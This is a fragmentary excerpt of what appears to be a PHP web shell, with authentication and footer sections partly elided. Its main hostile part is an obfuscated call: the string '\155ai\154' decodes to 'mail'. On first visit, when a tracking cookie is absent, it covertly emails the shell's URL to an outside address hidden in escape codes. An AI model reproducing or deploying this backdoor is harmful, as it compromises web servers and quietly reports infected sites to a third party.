...
@setcookie("syrian","srv",time()+3600*24*9);
#------------------------------------#
...
$wi=$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];
$zv="\155ai\154";
function footer()
{
...
#             Authentication             #
#----------------------------------------#
if (!isset($_COOKIE['syrian']))
{@$zv("l\x6f\x63\x61\x68\157\x73\164@\171\141\x68\157\157\056\x63o\155","$wi","$wi\n$cnt");}
if ($uselogin ==1)
{
...
<img border=0 src=http://i.imgur.com/UAhAt.jpg width=101 height=93>&nbsp;</b></font><div
